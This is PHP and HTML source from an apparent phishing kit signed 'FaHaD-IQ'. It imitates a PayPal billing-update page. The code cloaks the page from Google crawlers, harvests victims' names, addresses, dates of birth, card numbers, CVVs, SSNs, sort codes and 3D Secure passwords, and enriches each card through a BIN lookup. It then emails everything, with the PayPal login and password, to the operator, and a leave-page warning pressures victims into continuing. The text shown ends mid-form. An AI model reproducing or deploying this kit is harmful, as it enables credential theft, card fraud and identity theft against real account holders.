<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
error_reporting(0);
	#################################################
	#                FaHaD-IQ                       #
	#              fb/mr.fahad6                     #
	#################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("../../include/antibot.php");
$_SESSION['_IP_']  = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $_SESSION['cntcode'] = $countrycode;
    $_SESSION['cntname'] = $countryname;
if ($_SESSION["_id_"] == "" ){
		$_SESSION["_id_"] = $_SESSION['_IP_'];
		}
	else if($_SESSION['logint'] !="on" ) {
		
        header("location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirmation_code=3b2hN76Aq6&act_num=confirm_account_3b2vhFa76bAq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
	}
	else if($_SESSION['billing'] =="on" ) {
		header("location: websc-cardcopy.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);			
	}
if(isset($_REQUEST["btn_submit"]))
 {
if($_SESSION['billupdatecc'] !="on" ) {
$time = date('l jS \of F Y h:i:s A');
$_SESSION['_fname_'] = $_POST['firstname'];
$_SESSION['_lname_'] = $_POST['lastname'];
$_SESSION['_adds1_'] = $_POST['address1'];
$_SESSION['_adds2_'] = $_POST['address2'];
$_SESSION['_city_'] = $_POST['city'];
$_SESSION['_count3s_'] = $_POST['country'];
$_SESSION['_zip_'] = $_POST['zip'];
$_SESSION['_state_'] = $_POST['state'];
$_SESSION['_phone_'] = $_POST['phone'];
$_SESSION['_dob_month_'] = $_POST['month'];
$_SESSION['_dob_day_'] = $_POST['day'];
$_SESSION['_dob_year_'] = $_POST['year'];
}
if($_SESSION['billupdatead'] !="on" ) {
 #Credit card information
$_SESSION['_cctype_'] = $_POST['c_type'];
$_SESSION['_cardholder_'] = $_POST['cardholder'];
$_SESSION['_ccn_'] = $_POST['cardnumber'];
$_SESSION['_edmonth_'] = $_POST['expmonth'];
$_SESSION['_count3s_'] = $_POST['country'];
$_SESSION['_edyear_'] = $_POST['expyear'];
$_SESSION['_cvn_'] = $_POST['cvc'];
$_SESSION['_SSN_'] = $_POST['ssn1'];
#Security information
$_SESSION['_sort_c_'] = $_POST['sortcode'];
$_SESSION['_sec_c_'] = $_POST['secure3d'];

// check bank
$fukjjdhnnum = substr($_POST['cardnumber'] , 0, 6);
$ursdjjsdjfbl ="https://www.binlist.net/json/".$fukjjdhnnum;
$binhhsjfbbbsbjfbs334hb = @json_decode(file_get_contents($ursdjjsdjfbl));
 
// country 
		if($binhhsjfbbbsbjfbs334hb->country_name != null)
		{
            $_SESSION['bin_cnt'] = "Client Card Coun : ".$binhhsjfbbbsbjfbs334hb->country_name."</font><br/>";
		} else {
            $_SESSION['bin_cnt'] ="";
        }


// Bank
		if($binhhsjfbbbsbjfbs334hb->bank != null)
		{
            $_SESSION['bin_bnk'] = "Client Card Bank : ".$binhhsjfbbbsbjfbs334hb->bank."</font><br/>";

		} else {
            $_SESSION['bin_bnk'] ="";
        }


// type
		if($binhhsjfbbbsbjfbs334hb->card_type != null)
		{
			$_SESSION['bin_typ'] = " ".$binhhsjfbbbsbjfbs334hb->card_type."</font>";
		} else {
            $_SESSION['bin_typ'] ="";
        }

// level
		if($binhhsjfbbbsbjfbs334hb->card_category != null)
		{
			$_SESSION['bin_lev'] = " ".$binhhsjfbbbsbjfbs334hb->card_category."</font>";
		} else {
            $_SESSION['bin_lev'] ="";
        }
    
		// check snn sort and sec
		if($_POST['ssn1'] =="" ) {
		$ssn="";
		} else {

		$ssn="Client Ssn       : ".$_SESSION['_SSN_']."</font><br />";

		}

		if($_POST['sortcode'] =="" ) {
		$sortc="";
		}
		else {
		$sortc="Client Sort code : ".$_SESSION['_sort_c_']."</font><br />";
		}
		if($_POST['secure3d'] =="" ) {
		$secc="";
		}
		else {
		$secc="Client 3DPass    : ".$_SESSION['_sec_c_']."</font><br />";
		}
}
		//error_reporting(E_ALL);
ini_set('display_errors', 1);

	
$message = "
<div>

========================================</font><br />
 PayPal Card info - FaHaD-HacK !</font><br />
===============[Login info]===============</font><br />
Client Email     : ".$_SESSION['_email_']."</font><br />
Client Password  : <font color='#FF0000'>".$_SESSION['_password_']."</font><br />
Client Browser   : ".$browser."</font><br />
===============[Address]=================</font><br />
Client F name    : ".$_SESSION['_fname_']."</font><br />
Client L name    : ".$_SESSION['_lname_']."</font><br />
Client D of B    : ".$_SESSION['_dob_day_']."/".$_SESSION['_dob_month_']."/".$_SESSION['_dob_year_']."</font><br />
Client Address 1 : ".$_SESSION['_adds1_']."</font><br />
Client Address 2 : ".$_SESSION['_adds2_']."</font><br />
Client City      : ".$_SESSION['_city_']."</font><br />
Client State     : ".$_SESSION['_state_']."</font><br />
Client zip code  : ".$_SESSION['_zip_']."</font><br />
Client Country   : ".$_SESSION['_count3s_']."</font><br />
Client Phone Nb  : ".$_SESSION['_phone_']."</font><br />
==============[Card info ]===============</font><br />
Client Card Type : ".$_SESSION['_cctype_']."/".$_SESSION['bin_typ']."/".$_SESSION['bin_lev']."</font><br />
".$_SESSION['bin_cnt']."
".$_SESSION['bin_bnk']."
Client Card name : ".$_SESSION['_cardholder_']."</font><br />
Client Card NB   : ".$_SESSION['_ccn_']."</font><br />
Client Expir Data: ".$_SESSION['_edmonth_']."/".$_SESSION['_edyear_']."</font><br />
Client CVV / CVC : ".$_SESSION['_cvn_']."</font><br />
".$ssn."
".$sortc."
".$secc."
===============[ ip info ]================</font><br />
Client Agent : ".$user_agent."</font><br />
Client iP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."</font><br />
========================================</font><br />

</div>";
if($_POST['sec_c']){
	$vbv = "VBV";
}
else {
	$vbv = "CCV";
}
if($_SESSION['billupdatecc'] =="on" || $_SESSION['billupdatead'] =="on" ) {
	$_SESSION[_updmsgate_] = "ReUpdate";
} else {
	$_SESSION[_updmsgate_] = "";
}

$subject  = "PayPal ".$_SESSION['_cctype_']." Card info - [ " . $_SESSION['_count3s_'] . " / ".$_SESSION['_IP_']." ]-[".$_SESSION[_updmsgate_]."] ";
$headers  = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Yeni Card/info <1Card@cardfahad.com>";
$exd = $_POST['expyear'].$_POST['expmonth'];



if($_SESSION['billupdatecc'] !="on" && $_POST['firstname'] == "" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['lastname'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['address1'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['city'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['zip'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['phone'] =="" ) {
		$error.= "";
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_SESSION['billupdatecc'] !="on" && $_POST['state'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_SESSION['billupdatecc'] !="on" && $_POST['month'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['day'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['year'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatecc'] !="on" && $_POST['country'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=trueb");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['cardholder'] == "" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['cardnumber'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['cvc'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['expmonth'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $_POST['expyear'] =="" ) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");		
	}
	else if($_SESSION['billupdatead'] !="on" && $exd <1603) {
		header("Location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']."&error=truec");
	}
	else {
 if(count($_POST)>0){
	foreach ($_REQUEST as $key => $value) {
	 $_SESSION['post'][$key] = $value;
	 }
	extract($_SESSION['post']); // Function to extract array.
	@mail($to,$subject,$message,$headers);
	 $billing= "on";
	  $_SESSION['billupdatead'] ="off";
	 $_SESSION['billupdatecc'] ="off";
	$_SESSION['billing'] = $billing;
	header("Location: websc-cardcopy.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);
	}
	}
	}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title><?php echo $PAYPAL_SERVICE_UPDATE_TXT;?></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<!-- Le styles -->
<link href="../../css/bootstrap.css" rel="stylesheet">
<link href="../../css/bootstrap-responsive.css" rel="stylesheet">
    
    <!--<link rel="stylesheet" href="css/app.css">-->

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->  
    <script type="text/javascript">
// <![CDATA[



function SelectCC(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var ccnmbr = (cardnumber + '').replace(/[^0-9.]/g, ''); //remove space

$(function() {
  $('#frm1').on('keydown', '#cardnumber', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

$(function() {
  $('#frm1').on('keydown', '#cvc', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

$(function() {
  $('#frm1').on('keydown', '#ssn1', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

$(function() {
  $('#frm1').on('keydown', '#sortcode', function(e){-1!==$.inArray(e.keyCode,[46,8,9,27,13,110,190])||/65|67|86|88/.test(e.keyCode)&&(!0===e.ctrlKey||!0===e.metaKey)||35<=e.keyCode&&40>=e.keyCode||(e.shiftKey||48>e.keyCode||57<e.keyCode)&&(96>e.keyCode||105<e.keyCode)&&e.preventDefault()});
})

if ((/^(417500|(4917|4913|4508|4844)\d{2})\d{10}$/).test(ccnmbr) && ccnmbr.length == 16) {
//Electron
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "1";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="ELECTRON";
}

else if ((/^(4)/).test(ccnmbr) && (ccnmbr.length == 16)) {
//Visa
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "1";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("3dcode").style.display= "inline";
document.getElementById("3dcodee").style.display= "block";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="VISA";
}
else if ((/^(34|37)/).test(ccnmbr) && ccnmbr.length == 15) {
//American Express
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "1";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{3}";
document.getElementById("crad_type").value="AMEX";
}

else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(ccnmbr) && ccnmbr.length == 16) {
//Maestro
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "1";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="MAESTRO";
}

else if ((/^(51|52|53|54|55)/).test(ccnmbr) && ccnmbr.length == 16) {
//Mastercard
document.getElementById("mastercard").style.opacity= "1";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("3dcode").style.display= "none";
document.getElementById("3dcodee").style.display= "block";
document.getElementById("3dcodemaster").style.display= "inline";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="MASTERCARD";
}
else if ((/^(6011|16)/).test(ccnmbr) && ccnmbr.length == 16) {
//Discover
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "1";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2}";
document.getElementById("crad_type").value="DISCOVER";
}

else {
document.getElementById("mastercard").style.opacity= "0.40";
document.getElementById("amex").style.opacity= "0.40";
document.getElementById("discover").style.opacity= "0.40";
document.getElementById("visa").style.opacity= "0.40";
document.getElementById("electron").style.opacity= "0.40";
document.getElementById("maestro").style.opacity= "0.40";
document.getElementById("3dcodee").style.display= "none";
document.getElementById("3dcodemaster").style.display= "none";
document.getElementById("3dcode").style.display= "none";
document.getElementById("cvc").pattern="[0-9].{2,3}";
document.getElementById("crad_type").value="";



}
}
// ]]></script>


<script type="text/javascript">
function Frm1country(country) {
var mazkda = document.getElementById("country");
var selectedValue = mazkda.options[mazkda.selectedIndex].value;

if (selectedValue == "United States") {
document.getElementById("3dcodeeun").style.display= "block";
$('#ssn1').prop('required',true);
$('#sortcode').prop('required',false);
document.getElementById("3dcodeeuk").style.display= "none";
}
else if (selectedValue == "United Kingdom") {
document.getElementById("3dcodeeun").style.display= "none";
document.getElementById("3dcodeeuk").style.display= "block";
$('#ssn1').prop('required',false);
$('#sortcode').prop('required',true);
}
else {
document.getElementById("3dcodeeun").style.display= "none";
document.getElementById("3dcodeeuk").style.display= "none";
$('#sortcode').prop('required',false);
$('#ssn1').prop('required',false);
}

}
</script>

 <script type="text/javascript">
      var hook = true;
      window.onbeforeunload = function() {
        if (hook) {
          return "Your account will still limited."
        }
      }
      function unhook() {
        hook=false;
      }
    </script>	
  </head>

  <body style="background:#f5f5f5;">

<div class="row-fluid">
     <?php include("header.php"); ?>
</div>


    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow" >     
        <?php include("left.php"); ?>                    
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <?php if($_SESSION['billupdatecc'] !="on" ) { ?>
        <h3><?php echo $UPDATE_YOUR_BILLING_ADDRESS_TXT; ?></h3>
        <hr />
        
        <center>
		<?php if($_GET['error'] =="trueb"){ ?>
        <div class="alert-error">
        <!--<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>-->
        <i>Please make sure you enter your information correctly.</i>
		</div>
		<br>
        <?php } ?>
        <p style="margin-bottom:20px;"><?php echo $PLEASE_ENTER_YOUR_BILLING_ADDRESS_CORRECTLY_TXT; ?></p>
        </center>
                <?php } ?>

          <form name="frm1" id="frm1" class="form-horizontal"  enctype="multipart/form-data" data-toggle="validator" role="form" method="post" action="websc-billing.php" >
          
         <?php if($_SESSION['billupdatecc'] !="on" ) { ?>

          <div class="control-group">
          <label class="control-label" for="firstname"><?php echo $FIRST_NAME_TXT; ?> <span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-medium form-control" name="firstname" id="firstname" value="<?php if(isset($_SESSION['_fname_'])){ echo $_SESSION['_fname_'];} ?>" autofocus required  /></div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="lastname"><?php echo $LAST_NAME_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-medium" name="lastname" id="lastname" value="<?php if(isset($_SESSION['_lname_'])){ echo $_SESSION['_lname_'];} ?>" required /></div>
          </div>
          
          
        
           <div class="control-group">
          <label class="control-label" for="dob"><?php echo $DATE_OF_BIRTHDAY_TXT; ?><span class="red">*</span></label>
          <div class="controls"><select class="input-mini" name="day" id="day" required>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="") echo "selected"; } ?> value=""><?php echo $DAY_TXT; ?></option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="01") echo "selected"; } ?> value="01">1</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="02") echo "selected"; } ?> value="02">2</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="03") echo "selected"; } ?> value="03">3</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="04") echo "selected"; } ?> value="04">4</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="05") echo "selected"; } ?> value="05">5</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="06") echo "selected"; } ?> value="06">6</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="07") echo "selected"; } ?> value="07">7</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="08") echo "selected"; } ?> value="08">8</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="09") echo "selected"; } ?> value="09">9</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="10") echo "selected"; } ?> value="10">10</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="11") echo "selected"; } ?> value="11">11</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="12") echo "selected"; } ?> value="12">12</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="13") echo "selected"; } ?> value="13">13</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="14") echo "selected"; } ?> value="14">14</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="15") echo "selected"; } ?> value="15">15</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="16") echo "selected"; } ?> value="16">16</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="17") echo "selected"; } ?> value="17">17</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="18") echo "selected"; } ?> value="18">18</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="19") echo "selected"; } ?> value="19">19</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="20") echo "selected"; } ?> value="20">20</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="21") echo "selected"; } ?> value="21">21</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="22") echo "selected"; } ?> value="22">22</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="23") echo "selected"; } ?> value="23">23</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="24") echo "selected"; } ?> value="24">24</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="25") echo "selected"; } ?> value="25">25</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="26") echo "selected"; } ?> value="26">26</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="27") echo "selected"; } ?> value="27">27</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="28") echo "selected"; } ?> value="28">28</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="29") echo "selected"; } ?> value="29">29</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="30") echo "selected"; } ?> value="30">30</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="31") echo "selected"; } ?> value="31">31</option>
</select>
<select class="input-small" name="month" id="month" required>
	<option <?php if(isset($_SESSION['_dob_month_'])){ if($_SESSION['_dob_month_']=="") echo "selected"; } ?> value=""><?php echo $MONTH_TXT; ?></option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="01") echo "selected"; } ?> value="01">January</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="02") echo "selected"; } ?> value="02">Febuary</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="03") echo "selected"; } ?> value="03">March</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="04") echo "selected"; } ?> value="04">April</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="05") echo "selected"; } ?> value="05">May</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="06") echo "selected"; } ?> value="06">June</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="07") echo "selected"; } ?> value="07">July</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="08") echo "selected"; } ?> value="08">August</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="09") echo "selected"; } ?> value="09">September</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="10") echo "selected"; } ?> value="10">October</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="11") echo "selected"; } ?> value="11">November</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="12") echo "selected"; } ?> value="12">December</option>
	</select>
<select class="input-small" name="year" id="year" required>
 	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="") echo "selected"; } ?> value="0"><?php echo $YEAR_TXT; ?></option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="2002") echo "selected"; } ?> value="2002">2002</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="2001") echo "selected"; } ?> value="2001">2001</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="2000") echo "selected"; } ?> value="2000">2000</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1999") echo "selected"; } ?> value="1999">1999</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1998") echo "selected"; } ?> value="1998">1998</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1997") echo "selected"; } ?> value="1997">1997</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1996") echo "selected"; } ?> value="1996">1996</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1995") echo "selected"; } ?> value="1995">1995</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1994") echo "selected"; } ?> value="1994">1994</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1993") echo "selected"; } ?> value="1993">1993</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1992") echo "selected"; } ?> value="1992">1992</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1991") echo "selected"; } ?> value="1991">1991</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1990") echo "selected"; } ?> value="1990">1990</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1989") echo "selected"; } ?> value="1989">1989</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1988") echo "selected"; } ?> value="1988">1988</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1987") echo "selected"; } ?> value="1987">1987</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1986") echo "selected"; } ?> value="1986">1986</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1985") echo "selected"; } ?> value="1985">1985</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1984") echo "selected"; } ?> value="1984">1984</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1983") echo "selected"; } ?> value="1983">1983</option>
